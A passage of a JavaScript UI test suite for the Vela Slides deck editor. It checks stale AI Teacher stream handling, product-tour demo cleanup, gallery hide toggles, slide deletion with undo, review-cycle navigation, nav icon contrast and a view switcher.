      await _waitFor(() => transport.pending() === 1, 1500);
      hooks.loadReplacementDeckForTest();
      transport.resolveNext(JSON.stringify({ blocks: [{ type: "heading", text: "OLD TOOLBAR RESULT", size: "2xl" }] }));
      await _waitFor(() => transport.pending() === 0, 1500);
      await _wait(120);
      assertReplacement("old toolbar result");
    } finally {
      // This test opens the Quick Edit editor. A prior version left it open on
      // exit, so the next suite's Product Tour preflight saw an open draft and
      // blocked the tour, timing out later tests. Send the real Escape path the
      // control already supports so no open editor leaks into later tests.
      const leakedInput = _$("[data-testid='quick-edit-input']");
      if (leakedInput) {
        leakedInput.focus();
        leakedInput.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true, cancelable: true }));
        await _waitFor(() => !_$("[data-testid='quick-edit-input']"), 1500).catch(() => {});
      }
      transport.restore();
      hooks.restoreStartupDeck?.();
      await _wait(100);
    }
    // Regression: an open Quick Edit draft here would block the Product Tour
    // preflight for every later test in this suite. Fails without the cleanup above.
    if (_$("[data-testid='quick-edit-input']")) throw new Error("quick-edit-input leaked past toolbar test cleanup");
  }},
  { name: "Old Teacher stream cannot change a replacement deck", fn: async () => {
    const hooks = _hooks();
    const api = window.__velaDemoTest;
    const originalFetch = window.fetch;
    let resolveFetch = null;
    let oldWork = null;
    let fetchSettled = false;
    const settleFetch = (text) => {
      if (typeof resolveFetch !== "function" || fetchSettled) return false;
      fetchSettled = true;
      const encoder = new TextEncoder();
      let readCount = 0;
      resolveFetch({
        ok: true,
        body: {
          getReader: () => ({
            read: async () => readCount++ === 0
              ? { done: false, value: encoder.encode(`data: ${JSON.stringify({ type: "content_block_delta", delta: { text } })}\n\n`) }
              : { done: true },
          }),
        },
      });
      return true;
    };
    try {
      const deckAEpochBefore = hooks.getDeckStateForTest?.().epoch;
      if (!hooks.restoreStartupDeck?.()) throw new Error("could not restore deck A");
      await _waitFor(() => {
        const current = hooks.getDeckStateForTest?.();
        return current?.epoch === deckAEpochBefore + 1 && current.deckTitle === "Vela Slides — Live Demo";
      }, 1500);
      if (!hooks.injectStudyNotes(null)) throw new Error("could not remove authored study notes");
      await _wait(80);
      window.fetch = () => new Promise((resolve) => { resolveFetch = resolve; });
      document.activeElement?.blur?.();
      _key("f");
      const studentToggle = await _waitFor(() => _$("[data-testid='student-toggle']"), 3000);
      _click(studentToggle);
      await _waitFor(() => _$("[data-teacher-panel]:not([data-study-panel])"), 3000);
      const sendQuestion = await _waitFor(() => typeof window.__velaTeacherEpochTest === "function" ? window.__velaTeacherEpochTest : null, 1500);
      const oldEpoch = hooks.getDeckStateForTest().epoch;
      oldWork = sendQuestion("old epoch Teacher question");
      await _waitFor(() => typeof resolveFetch === "function", 2000);
      await _waitFor(() => {
        const current = hooks.getDeckStateForTest();
        return current.teacherLoading && JSON.stringify(current.teacherHistory).includes("old epoch Teacher question");
      }, 1500);
      if (!hooks.loadReplacementDeckForTest()) throw new Error("replacement deck did not load");
      await _waitFor(() => hooks.getDeckStateForTest().epoch === oldEpoch + 1, 1500);
      settleFetch("OLD TEACHER RESULT\n\n---QUESTIONS---\n1. OLD TEACHER QUESTION?");
      await Promise.race([oldWork, _wait(2000).then(() => { throw new Error("old Teacher callback did not complete"); })]);
      await _wait(80);
      const current = hooks.getDeckStateForTest();
      const staleTeacherState = JSON.stringify(current.teacherHistory);
      if (current.deckTitle !== "Replacement deck sentinel"
          || current.guidelines !== "replacement epoch retained"
          || current.firstLaneTitle !== "Replacement lane sentinel"
          || current.firstItemTitle !== "Replacement module sentinel"
          || current.firstBlockText !== "REPLACEMENT CONTENT SENTINEL"
          || current.brandingAccentColor !== "#123456"
          || current.brandingFooterLeft !== "Replacement branding sentinel"
          || current.selectedId !== current.firstItemId
          || current.slideIndex !== 0
          || current.fullscreen
          || current.veraMode !== "editor"
          || current.teacherLoading
          || current.chatLoading
          || current.aiWork
          || Object.keys(current.teacherHistory || {}).length
          || staleTeacherState.includes("OLD TEACHER RESULT")
          || staleTeacherState.includes("OLD TEACHER QUESTION")) {
        throw new Error(`old Teacher stream changed replacement state: ${JSON.stringify(current)}`);
      }
      if (api?.unavailableReason?.()?.includes("Wait for Vera")) throw new Error("old Teacher work left an AI activity indicator");
      const rows = await _waitFor(() => {
        const found = _$$("[data-testid='toc-slide-row']");
        return found.length > 1 ? found : null;
      }, 2000);
      _click(rows[1]);
      await _waitFor(() => {
        const next = hooks.getDeckStateForTest();
        return next.selectedId === current.firstItemId
          && next.slideIndex === 1
          && next.selectedBlockText === "REPLACEMENT NAVIGATION SENTINEL";
      }, 1500);
    } finally {
      settleFetch("");
      if (oldWork) await Promise.race([oldWork, _wait(500)]).catch(() => {});
      window.fetch = originalFetch;
      hooks.restoreStartupDeck?.();
      await _wait(100);
    }
  }},
  { name: "AI activity leases release for mocked API and Teacher timeout work", fn: async () => {
    if (typeof window.__velaAILeaseTest !== "function") throw new Error("AI lease behavior hook missing");
    const results = await window.__velaAILeaseTest();
    const failed = results.filter((result) => !result.pass);
    if (failed.length) throw new Error(`AI lease probes failed: ${JSON.stringify(failed)}`);
    if (results.length !== 3) throw new Error(`unexpected AI lease probe count: ${results.length}`);
  }},
  { name: "Fast tour reaches every showcased state and restores the editor", fn: async () => {
    const api = window.__velaDemoTest;
    const hooks = _hooks();
    if (!api || !hooks.getSelection || !hooks.getChatState) throw new Error("demo test hook missing");
    const before = hooks.getSelection();
    const chatBefore = hooks.getChatState();
    const historyBefore = hooks.getHistoryCounts?.();
    hooks.addTeacherMessage?.("__demo-test", "Keep this teacher message");
    const teacherBefore = hooks.getTeacherHistory?.();
    const scenes = [], cues = {};
    const onScene = (event) => scenes.push(event.detail.title);
    const onCue = (event) => {
      const name = event.detail.name;
      const checks = {
        outline: () => !!_$("[data-testid='toc-tree']"),
        "inline-edit": () => _$("[contenteditable='true']")?.textContent === DEMO_EDIT_TEXT,
        flow: () => !!_$("[data-block-type='flow']"),
        data: () => !!_$("[data-block-type='table']"),
        "layouts-1": () => {
          const body = document.body.textContent || "";
          return body.includes("Visitors") && body.includes("Describe");
        },
        "layouts-2": () => {
          const body = document.body.textContent || "";
          return body.includes("Quick Wins") && body.includes("Comparison block");
        },
        columns: () => !!_$("[data-block-type='badge']"),
        gallery: () => !!_$("[data-testid='gallery-close']"),
        "smart-merge": () => !_$("[data-testid='gallery-close']") && (document.body.textContent || "").includes("Smart Merge"),
        branding: () => {
          const btn = _$("[data-testid='brand-toggle']");
          return !!btn && getComputedStyle(btn).backgroundColor !== "rgba(0, 0, 0, 0)";
        },
        comments: () => !!_$("[data-testid='comments-toggle']"),
        present: () => !_$("header") && !!_$("[data-testid='presenter-toggle']") && !document.fullscreenElement,
        student: () => hooks.getVeraMode?.() === "student",
        presenter: () => !!_$("[data-testid='presenter-view']"),
        "ai-editing": () => document.body.textContent.includes("Improve") || document.body.textContent.includes("Variants"),
        "batch-edit": () => !!_$("[data-testid='batch-edit-panel']"),
        vera: () => {
          const trace = _$("[data-testid='vera-tool-trace'][data-tool-name='deck_stats']");
          return !!trace && _$$("[data-testid='vera-chat-response']").some((r) => r.textContent?.includes("I checked the live deck structure"));
        },
        cli: () => !!_$("[data-block-type='code']"),
        desktop: () => !!_$("[data-block-type='callout']"),
        "pdf-export": () => !!_$("[data-testid='pdf-export-preview']") && !_$("[data-testid='pdf-export-download']"),
        // The scene ends during export rendering. The harness proves the exact
        // UI boundary: a preview exists and the actionable download anchor does
        // not. It does not claim to observe browser downloads that no control can start.
        "pptx-export": () => !!_$("[data-testid='pptx-export-preview']") && !_$("[data-testid='pptx-export-download']"),
      };
      cues[name] = checks[name] ? checks[name]() : false;
    };
    window.addEventListener("vela-demo-scene", onScene);
    window.addEventListener("vela-demo-cue", onCue);
    const done = new Promise((resolve) => window.addEventListener("vela-demo-complete", (event) => resolve(event.detail), { once: true }));
    api.run(0.02);
    const result = await Promise.race([done, _wait(32000).then(() => { throw new Error("fast demo timed out"); })]); // 32000ms (was 16000ms): 2x slack for scaled-demo wait-floor overhead on a slower CI host
    window.removeEventListener("vela-demo-scene", onScene);
    window.removeEventListener("vela-demo-cue", onCue);
    if (result.reason !== "complete" || result.failures.length) throw new Error(`demo result: ${JSON.stringify(result)}`);
    if (result.mockAI?.stepCalls !== 2 || result.mockAI?.liveCalls !== 0) throw new Error(`demo AI calls: ${JSON.stringify(result.mockAI)}`);
    const plan = api.plan();
    if (JSON.stringify(scenes) !== JSON.stringify(plan.titles)) throw new Error(`observed scene order: ${JSON.stringify(scenes)}`);
    const expectedCues = ["outline", "inline-edit", "flow", "data", "layouts-1", "layouts-2", "columns", "gallery", "smart-merge", "branding", "comments", "present", "student", "presenter", "ai-editing", "batch-edit", "vera", "cli", "desktop", "pdf-export", "pptx-export"];
    for (const cue of expectedCues) if (!cues[cue]) throw new Error(`showcase state not reached: ${cue}`);
    const after = hooks.getSelection();
    if (JSON.stringify(after) !== JSON.stringify(before)) throw new Error(`selection not restored: before=${JSON.stringify(before)} after=${JSON.stringify(after)}`);
    const chatAfter = hooks.getChatState();
    if (JSON.stringify(chatAfter) !== JSON.stringify(chatBefore)) throw new Error("chat state not restored");
    const historyAfter = hooks.getHistoryCounts?.();
    if (JSON.stringify(historyAfter) !== JSON.stringify(historyBefore)) throw new Error(`undo history changed: before=${JSON.stringify(historyBefore)} after=${JSON.stringify(historyAfter)}`);
    const teacherAfter = hooks.getTeacherHistory?.();
    if (JSON.stringify(teacherAfter) !== JSON.stringify(teacherBefore)) throw new Error("teacher history not restored");
    hooks.clearTeacherHistory?.("__demo-test");
    if (window.__velaDemoAI) throw new Error("demo AI mock was not removed");
    if (_$("[data-testid='demo-overlay']") || _$("[data-testid='branding-panel']") || _$("[data-testid='gallery-close']") || _$("[data-testid='presenter-view']")
        || _$("[data-testid='pptx-export-modal']") || _$("[data-testid='pdf-export-modal']") || _$("[contenteditable='true']")) throw new Error("tour left a transient surface open");
  }},
  { name: "Stop cancels the active scene and restores the prior state", fn: async () => {
    const api = window.__velaDemoTest;
    const hooks = _hooks();
    if (!api || !hooks.getSelection) throw new Error("demo or selection test hook missing");
    const before = hooks.getSelection();
    const brandingReady = new Promise((resolve) => {
      const handler = (event) => {
        if (event.detail.name === "branding") {
          window.removeEventListener("vela-demo-cue", handler);
          resolve();
        }
      };
      window.addEventListener("vela-demo-cue", handler);
    });
    const done = new Promise((resolve) => window.addEventListener("vela-demo-complete", (event) => resolve(event.detail), { once: true }));
    api.run(0.03);
    await Promise.race([brandingReady, _wait(20000).then(() => { throw new Error("branding scene did not start"); })]); // 20000ms (was 10000ms): 2x slack for scaled-demo wait-floor overhead on a slower CI host
    api.stop();
    const result = await Promise.race([done, _wait(5000).then(() => { throw new Error("demo stop timed out"); })]);
    if (result.reason !== "stopped") throw new Error(`stop result: ${JSON.stringify(result)}`);
    if (window.__velaDemoAI) throw new Error("stop left the demo AI mock installed");
    const after = hooks.getSelection();
    if (JSON.stringify(after) !== JSON.stringify(before)) throw new Error(`selection not restored after stop: before=${JSON.stringify(before)} after=${JSON.stringify(after)}`);
    if (!_$("header")) throw new Error("editor header not restored");
    await _waitFor(() => {
      const brandBtn = _$("[data-testid='brand-toggle']");
      return !_$("[data-testid='branding-panel']") && (!brandBtn || getComputedStyle(brandBtn).backgroundColor === "rgba(0, 0, 0, 0)");
    }, 1000).catch(() => { throw new Error("stop left the branding panel open"); });
    if (_$("[data-testid='demo-overlay']") || _$("[data-testid='branding-panel']") || _$("[data-testid='gallery-close']") || _$("[data-testid='presenter-view']")
        || _$("[data-testid='pptx-export-modal']") || _$("[data-testid='pdf-export-modal']") || _$("[contenteditable='true']")) throw new Error("stop left a transient surface open");
  }},
  { name: "Callout position: target-scene card shows no initial corner jump; centered scenes render at once", fn: async () => {
    const api = window.__velaDemoTest;
    if (!api) throw new Error("demo test hook missing");
    // The two scenes whose target only mounts once their action runs
    // (fullscreen present-mode controls) — the confirmed callout-jump cases.
    const targetScenes = ["Present with Confidence", "Student & Audience Tools"];
    const centeredTitles = ["Vela Slides", "Ready to Build"];
    const activeScene = { title: null };
    const firstVisible = {}, settled = {}, sawPending = {}, centeredImmediate = {};
    const centeredChecks = [];

    const onScene = (event) => {
      activeScene.title = event.detail.title;
      if (centeredTitles.includes(event.detail.title)) {
        const title = event.detail.title;
        // Centered/no-target scenes must show their card at once — bounded
        // by a much shorter window than the target-scene fallback below.
        centeredChecks.push(_waitFor(() => {
          const overlay = _$(`[data-demo-scene="${title}"]`);
          return overlay && overlay.getAttribute("data-demo-pending") !== "true" ? true : null;
        }, 200, 4).then(() => { centeredImmediate[title] = true; }).catch(() => { centeredImmediate[title] = false; }));
      }
    };
    window.addEventListener("vela-demo-scene", onScene);

    let polling = true;
    const pollLoop = (async () => {
      while (polling) {
        const title = activeScene.title;
        if (title && targetScenes.includes(title)) {
          const overlay = _$(`[data-demo-scene="${title}"]`);
          if (overlay && overlay.getAttribute("data-demo-pending") === "true") sawPending[title] = true;
          if (!firstVisible[title]) {
            const card = overlay && overlay.getAttribute("data-demo-pending") !== "true" ? _$("[data-testid='demo-card']") : null;
            if (card) firstVisible[title] = { left: getComputedStyle(card).left, top: getComputedStyle(card).top, at: performance.now() };
          } else if (!settled[title] && performance.now() - firstVisible[title].at >= 60) {
            const card = _$("[data-testid='demo-card']");
            if (card) settled[title] = { left: getComputedStyle(card).left, top: getComputedStyle(card).top };
          }
        }
        await _wait(8);
      }
    })();

    const done = new Promise((resolve) => window.addEventListener("vela-demo-complete", (event) => resolve(event.detail), { once: true }));
    api.run(0.05);
    const result = await Promise.race([done, _wait(40000).then(() => { throw new Error("demo timed out"); })]); // 40000ms (was 20000ms): 2x slack for scaled-demo wait-floor overhead on a slower CI host
    polling = false;
    await pollLoop;
    window.removeEventListener("vela-demo-scene", onScene);
    await Promise.all(centeredChecks);

    if (result.reason !== "complete" || result.failures.length) throw new Error(`demo result: ${JSON.stringify(result)}`);
    for (const title of targetScenes) {
      if (!firstVisible[title]) throw new Error(`${title}: card never became visible (missing-target fallback did not fire within its bound)`);
      if (!settled[title]) throw new Error(`${title}: card position not sampled again beyond one poll tick`);
      if (firstVisible[title].left !== settled[title].left || firstVisible[title].top !== settled[title].top) {
        throw new Error(`${title}: card jumped from ${JSON.stringify(firstVisible[title])} to ${JSON.stringify(settled[title])}`);
      }
    }
    for (const title of centeredTitles) {
      if (centeredImmediate[title] !== true) throw new Error(`${title}: centered scene did not render immediately`);
    }
  }},
], { setup: _productTourSetup });

// ── meridian CR04 / CR14 / CR07 (sprint "meridian") ──────────────────
const _m1RowTitles = () => _tocRows().map((r) => (Array.from(r.querySelectorAll("span")).find((x) => x.style.textOverflow === "ellipsis")?.textContent || "").trim());
const _m1Undo = async () => { document.activeElement?.blur?.(); await _wait(80); _key("z", { ctrlKey: true }); await _wait(250); };
const _m1ClickRow = async (i) => { const r = _tocRows()[i]; if (!r) throw new Error("no TOC row " + i); _click(r); await _waitFor(() => _tocRows()[i]?.getAttribute("aria-selected") === "true", 800).catch(() => {}); await _wait(150); document.activeElement?.blur?.(); };

uiSuite("meridian-CR04 Gallery hide toggle", [
  { name: "gallery card shows a hide toggle beside delete; click hides, click again unhides", fn: async () => {
    const btn = _$("[data-testid='editor-gallery-toggle']");
    if (!btn) throw new Error("editor-gallery-toggle missing");
    _click(btn);
    await _waitFor(() => _$("[data-testid='gallery-slide']"), 5000);
    const card = () => _$$("[data-testid='gallery-slide']")[0];
    const tog = () => card()?.querySelector("[data-testid='gallery-hide-toggle']");
    if (!tog()) throw new Error("gallery-hide-toggle missing on the card");
    const del = Array.from(card().querySelectorAll("button")).find((b) => b.title === "Delete slide");
    if (!del || tog().nextElementSibling !== del) throw new Error("hide toggle is not next to the delete button");
    if (tog().getAttribute("data-hidden") !== "0") throw new Error("first slide already hidden");
    const rowHidden = () => (_tocRows()[0]?.textContent || "").includes("🙈");
    _click(tog());
    await _waitFor(() => tog()?.getAttribute("data-hidden") === "1", 1500);
    if (!card().querySelector("[data-hidden-overlay]")) throw new Error("hidden card thumbnail not dimmed");
    if (!rowHidden()) throw new Error("TOC row does not show the slide as hidden (not the same effect)");
    _click(tog());
    await _waitFor(() => tog()?.getAttribute("data-hidden") === "0", 1500);
    if (card().querySelector("[data-hidden-overlay]") || rowHidden()) throw new Error("unhide did not restore the slide");
    _click(_$("[data-testid='editor-gallery-toggle']"));
    await _waitFor(() => !_$("[data-testid='gallery-slide']"), 3000).catch(() => {});
  }},
], { setup: _editorSetup });

uiSuite("meridian-CR14 TOC slide delete", [
  { name: "each slide row has a delete icon", fn: async () => {
    const rows = _tocRows();
    if (rows.length < 2) throw new Error("need >=2 slide rows, got " + rows.length);
    if (!rows.every((r) => r.querySelector("[data-testid='toc-slide-delete']"))) throw new Error("a slide row has no toc-slide-delete icon");
  }},
  { name: "click deletes that slide only; undo restores it", fn: async () => {
    const before = _m1RowTitles();
    _click(_tocRows()[1].querySelector("[data-testid='toc-slide-delete']"));
    await _waitFor(() => _tocRows().length === before.length - 1, 1500);
    const want = before.filter((_, i) => i !== 1).join("|");
    if (_m1RowTitles().join("|") !== want) throw new Error("wrong slide removed: " + _m1RowTitles().join("|"));
    await _m1Undo();
    await _waitFor(() => _tocRows().length === before.length, 1500);
    if (_m1RowTitles().join("|") !== before.join("|")) throw new Error("undo did not restore the slide list");
  }},
], { setup: _editorSetup });

uiSuite("meridian-CR07 Review cycle", [
  { name: "reviewed checkmark and review-cycle toggle render in the editor", fn: async () => {
    await _waitFor(() => _$("[data-testid='reviewed-toggle']") && _$("[data-testid='review-cycle-toggle']"), 2000);
  }},
  { name: "cycle on: arrows skip a reviewed slide; cycle off: arrows visit it again", fn: async () => {
    if (_tocRows().length < 3) throw new Error("need >=3 slide rows");
    const rt = () => _$("[data-testid='reviewed-toggle']");
    const cyc = () => _$("[data-testid='review-cycle-toggle']");
    const selIdx = () => _tocRows().findIndex((r) => r.getAttribute("aria-selected") === "true");
    try {
      await _m1ClickRow(1);
      if (rt().getAttribute("data-reviewed") !== "0") throw new Error("slide 2 already reviewed");
      _click(rt());
      await _waitFor(() => rt()?.getAttribute("data-reviewed") === "1", 1500);
      await _m1ClickRow(0);
      _click(cyc());
      await _waitFor(() => cyc()?.getAttribute("aria-pressed") === "true", 1500);
      document.activeElement?.blur?.();
      _key("ArrowRight");
      await _waitFor(() => selIdx() === 2, 1500).catch(() => { throw new Error("ArrowRight did not skip the reviewed slide (at row " + selIdx() + ")"); });
      _key("ArrowLeft");
      await _waitFor(() => selIdx() === 0, 1500).catch(() => { throw new Error("ArrowLeft did not skip the reviewed slide (at row " + selIdx() + ")"); });
      _click(cyc());
      await _waitFor(() => cyc()?.getAttribute("aria-pressed") === "false", 1500);
      document.activeElement?.blur?.();
      _key("ArrowRight");
      await _waitFor(() => selIdx() === 1, 1500).catch(() => { throw new Error("cycle off: ArrowRight did not visit slide 2 (at row " + selIdx() + ")"); });
    } finally {
      if (cyc()?.getAttribute("aria-pressed") === "true") _click(cyc());
      await _m1ClickRow(1);
      if (rt()?.getAttribute("data-reviewed") === "1") { _click(rt()); await _waitFor(() => rt()?.getAttribute("data-reviewed") === "0", 1500).catch(() => {}); }
    }
  }},
], { setup: _editorSetup });

// ── meridian-CR10 / meridian-CR11: fullscreen nav icons keep a visible chip
// on any slide background (light or dark), so they do not fade into the slide. ──
// Emoji glyphs must carry emoji presentation and a light colour: a text-style
// glyph draws in the inherited (dark, light-theme) text colour on the dark chip.
const _mrdIsLightTheme = () => { const h = _$("header"); const m = (h ? getComputedStyle(h).backgroundColor : "").match(/\d+/g); return !!m && (+m[0] + +m[1] + +m[2]) / 3 >= 128; };
const _mrdCheckNavGlyphs = async () => {
  for (const id of ["presenter-toggle", "student-toggle"]) {
    const el = await _waitFor(() => _$(`[data-testid='${id}']`), 2000);
    const sp = el.querySelector("span");
    if (!sp) throw new Error(`${id}: no glyph`);
    if (id !== "student-toggle" && !/️/.test(sp.textContent)) throw new Error(`${id}: glyph lacks emoji presentation (U+FE0F)`);
    const c = getComputedStyle(sp).color;
    if (c !== "rgb(255, 255, 255)") throw new Error(`${id}: glyph colour ${c} is not light`);
    const r = el.getBoundingClientRect();
    const hit = document.elementFromPoint(r.left + r.width / 2, r.top + r.height / 2);
    if (!hit || !el.contains(hit)) throw new Error(`${id}: covered by another element`);
  }
};
uiSuite("meridian-CR10-CR11 Nav Icon Contrast", [
  { name: "Enter fullscreen (Present)", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("f");
    await _waitFor(() => !_$("header"));
  }},
  { name: "gallery/presenter/edit nav buttons render with a non-transparent chip", fn: async () => {
    const ids = ["presenter-toggle", "present-edit-toggle"];
    for (const id of ids) {
      const el = await _waitFor(() => _$(`[data-testid='${id}']`), 2000);
      const bg = getComputedStyle(el).backgroundColor;
      // A transparent/near-transparent chip means the icon has no backing plate
      // and can vanish against a light slide (CR10/CR11's reported bug).
      if (!bg || bg === "rgba(0, 0, 0, 0)" || bg === "transparent") {
        throw new Error(`${id}: no backing chip (background=${bg})`);
      }
    }
  }},
  { name: "emoji nav glyphs are emoji-presentation and light in this app theme", fn: _mrdCheckNavGlyphs },
  { name: "edit icon stays visible on toggle (on/off, CR11's 'sometimes shows')", fn: async () => {
    const btn = await _waitFor(() => _$("[data-testid='present-edit-toggle']"), 2000);
    const bgOff = getComputedStyle(btn).backgroundColor;
    if (bgOff === "rgba(0, 0, 0, 0)" || bgOff === "transparent") throw new Error("edit icon has no chip while off");
    _click(btn);
    await _wait(120);
    const bgOn = getComputedStyle(btn).backgroundColor;
    if (bgOn === "rgba(0, 0, 0, 0)" || bgOn === "transparent") throw new Error("edit icon has no chip while on");
    _click(btn); // restore
    await _wait(120);
  }},
  { name: "Exit fullscreen", fn: async () => {
    _key("f");
    await _waitFor(() => _$("header"));
  }},
  { name: "emoji nav glyphs stay light in the other app theme too", fn: async () => {
    const before = _mrdIsLightTheme();
    document.activeElement?.blur(); await _wait(50);
    _key("d");
    await _waitFor(() => _mrdIsLightTheme() !== before, 2000);
    try {
      _key("f");
      await _waitFor(() => !_$("header"), 2000);
      await _mrdCheckNavGlyphs();
    } finally {
      if (!_$("header")) { _key("f"); await _waitFor(() => _$("header"), 2000); }
      document.activeElement?.blur(); await _wait(50);
      _key("d");
      await _waitFor(() => _mrdIsLightTheme() === before, 2000);
    }
  }},
]);

// ── meridian-CR13: editor|presenter|gallery view switcher next to Present ──
// One switch in three places — top bar (view-switch), gallery header
// (gallery-view-switch) and fullscreen controls (fs-view-switch) — all driven by
// SlidePanel's single view state. Each must be on top (elementFromPoint) where shown.
const _mrdSeg = (where, mode) => _$(`[data-testid='${where}-${mode}']`);
const _mrdActive = (where) => _$(`[data-testid='${where}'] button[aria-pressed='true']`)?.getAttribute("aria-label") || null;
const _mrdOnTop = (el, label) => {
  const r = el.getBoundingClientRect();
  const hit = document.elementFromPoint(r.left + r.width / 2, r.top + r.height / 2);
  if (!hit || !el.contains(hit)) throw new Error(`${label} is covered (elementFromPoint hit ${hit?.tagName || "nothing"})`);
};
const _mrdSwitchTo = async (where, mode) => {
  const btn = await _waitFor(() => _mrdSeg(where, mode), 2000);
  _mrdOnTop(btn, `${where}-${mode}`);
  _click(btn);
};
const _mrdGalleryOpen = () => !!_$("[data-testid='gallery-close']");
uiSuite("meridian-CR13 View Switcher", [
  { name: "View switcher renders next to Present in the editor", fn: async () => {
    await _waitFor(() => _$("[data-testid='view-switch']") && _$("[data-testid='present-btn']"), 2000);
  }},
  { name: "Editor segment is the active view on load", fn: async () => {
    const btn = await _waitFor(() => _$("[data-testid='view-switch-editor']"), 2000);
    if (btn.getAttribute("aria-pressed") !== "true") throw new Error("editor segment not marked active");
  }},
  { name: "Switch glyphs use emoji presentation (no text-style glyph)", fn: async () => {
    const g = await _waitFor(() => _mrdSeg("view-switch", "gallery"), 2000);
    if (!/️/.test(g.textContent)) throw new Error("gallery glyph lacks U+FE0F");
  }},
  { name: "Deck title keeps readable width in the top bar", fn: async () => {
    const h = await _waitFor(() => _$("header"), 2000);
    const t = _$$("span", h).find((s) => s.title && s.title === s.textContent);
    if (!t) throw new Error("deck title not found in header");
    const w = t.getBoundingClientRect().width;
    const need = Math.min(100, t.scrollWidth);
    if (w < need) throw new Error(`deck title squeezed to ${Math.round(w)}px at ${window.innerWidth}px wide`);
    if (h.scrollWidth > h.clientWidth + 1) throw new Error(`header overflows (${h.scrollWidth} > ${h.clientWidth})`);
  }},
  { name: "Top bar fits on one line at every width 1024-1920 (8px sweep)", fn: async () => {
    // The top bar fits itself to its own measured width, so forcing the header
    // width stands in for a window resize. Sweeps up, then down (hysteresis).
    const h = await _waitFor(() => _$("header"), 2000);
    const frames = () => new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r)));
    const prev = h.style.width;
    const bad = [];
    try {
      for (const dir of [1, -1]) {
        for (let i = 0; i <= 112; i++) {
          const w = dir > 0 ? 1024 + i * 8 : 1920 - i * 8;
          h.style.width = `${w}px`;
          for (let f = 0; f < 3; f++) await frames();
          const btns = _$$("button", h).filter((b) => b.offsetParent && !b.closest("[role='group']"));
          const minH = Math.min(...btns.map((b) => b.offsetHeight));
          const wrapped = btns.filter((b) => b.offsetHeight > minH + 8).map((b) => b.title || b.textContent.trim());
          const t = _$$("span", h).find((s) => s.title && s.title === s.textContent);
          const vs = _$("[data-testid='view-switch']", h);
          const hr = h.getBoundingClientRect(), vr = vs ? vs.getBoundingClientRect() : null;
          const errs = [];
          if (h.scrollWidth > h.clientWidth + 1) errs.push(`overflow ${h.scrollWidth}>${h.clientWidth}`);
          if (wrapped.length) errs.push(`wrapped: ${wrapped.join(", ")}`);
          if (!t || t.getBoundingClientRect().width < Math.min(120, t.scrollWidth) - 1) errs.push(`title ${t ? Math.round(t.getBoundingClientRect().width) : "missing"}px`);
          if (!vr || vr.width < 60 || vr.left < hr.left || vr.right > hr.right + 1) errs.push("view switch not fully shown");
          if (errs.length) bad.push(`${w}px: ${errs.join("; ")}`);
        }
      }
    } finally {
      h.style.width = prev;
      await frames();
    }
    if (bad.length) throw new Error(`${bad.length} widths fail — ${bad.slice(0, 4).join(" | ")}`);
  }},
  { name: "Gallery is reachable in one click from the editor", fn: async () => {
    await _mrdSwitchTo("view-switch", "gallery");
    await _waitFor(_mrdGalleryOpen, 2000);
    // The top bar re-reads the view state one render later (ribbon update).
    await _waitFor(() => _mrdActive("view-switch") === "Gallery", 2000).catch(() => { throw new Error("gallery segment not marked active after switch"); });
  }},
  { name: "Gallery header shows the switch on top, Gallery active", fn: async () => {
    await _waitFor(() => _$("[data-testid='gallery-view-switch']"), 2000);
    if (_mrdActive("gallery-view-switch") !== "Gallery") throw new Error(`gallery switch active=${_mrdActive("gallery-view-switch")}`);
    for (const m of ["editor", "presenter", "gallery"]) _mrdOnTop(_mrdSeg("gallery-view-switch", m), `gallery-view-switch-${m}`);
  }},
  { name: "Editor segment in the gallery returns to the editor", fn: async () => {
    await _mrdSwitchTo("gallery-view-switch", "editor");
    await _waitFor(() => !_mrdGalleryOpen() && _$("header"), 2000);
    await _waitFor(() => _mrdActive("view-switch") === "Editor", 2000).catch(() => { throw new Error("top switch not back on Editor"); });
  }},
  { name: "Presenter segment in the gallery enters fullscreen Present", fn: async () => {
    await _mrdSwitchTo("view-switch", "gallery");
    await _waitFor(_mrdGalleryOpen, 2000);
    await _mrdSwitchTo("gallery-view-switch", "presenter");
    await _waitFor(() => !_mrdGalleryOpen() && !_$("header"), 2000);
  }},
  { name: "Fullscreen shows the switch on top, Presenter active", fn: async () => {
    await _waitFor(() => _$("[data-testid='fs-view-switch']"), 2000);
    if (_mrdActive("fs-view-switch") !== "Presenter") throw new Error(`fs switch active=${_mrdActive("fs-view-switch")}`);
    for (const m of ["editor", "presenter", "gallery"]) _mrdOnTop(_mrdSeg("fs-view-switch", m), `fs-view-switch-${m}`);
  }},
  { name: "Gallery segment in fullscreen opens the gallery (Gallery active)", fn: async () => {
    await _mrdSwitchTo("fs-view-switch", "gallery");
    await _waitFor(_mrdGalleryOpen, 2000);
    if (_mrdActive("gallery-view-switch") !== "Gallery") throw new Error("gallery switch not on Gallery");
    await _mrdSwitchTo("gallery-view-switch", "presenter");
    await _waitFor(() => !_mrdGalleryOpen() && _mrdActive("fs-view-switch") === "Presenter", 2000);
  }},
  { name: "Editor segment in fullscreen exits to the editor", fn: async () => {
    await _mrdSwitchTo("fs-view-switch", "editor");
    await _waitFor(() => _$("header") && _mrdActive("view-switch") === "Editor", 2000);
  }},
  { name: "Presenter segment enters fullscreen Present", fn: async () => {
    const btn = await _waitFor(() => _$("[data-testid='view-switch-presenter']"), 2000);
    _click(btn);
    await _waitFor(() => !_$("header"), 2000);
  }},
  { name: "Exit fullscreen back to the editor (F key)", fn: async () => {
    document.activeElement?.blur(); await _wait(100);
    _key("f");
    await _waitFor(() => _$("header"), 2000);
  }},
]);
// ── Sprint meridian (C3): split image alignment, accent 0, docked branding
// pane, toolbar room above, link badge placement ──────────────────────
const _mrdSvg = (w, h, color) =>
  `data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20width='${w}'%20height='${h}'%3E%3Crect%20width='${w}'%20height='${h}'%20fill='%23${color}'/%3E%3C/svg%3E`;
const _mrdViewport = () => _$("[data-testid='slide-viewport']");
const _mrdFrame = () => new Promise((resolve) => requestAnimationFrame(() => requestAnimationFrame(resolve)));
const _mrdInject = async (blocks, extra, ready) => {
  const hooks = _hooks();
  if (typeof hooks.injectBlocks !== "function") throw new Error("injectBlocks test hook not exposed");
  hooks.injectBlocks(blocks, { layout: undefined, verticalAlign: undefined, padding: null, ...(extra || {}) });
  const el = await _waitFor(() => ready(_mrdViewport()), 3000);
  await _mrdFrame();
  return el;
};
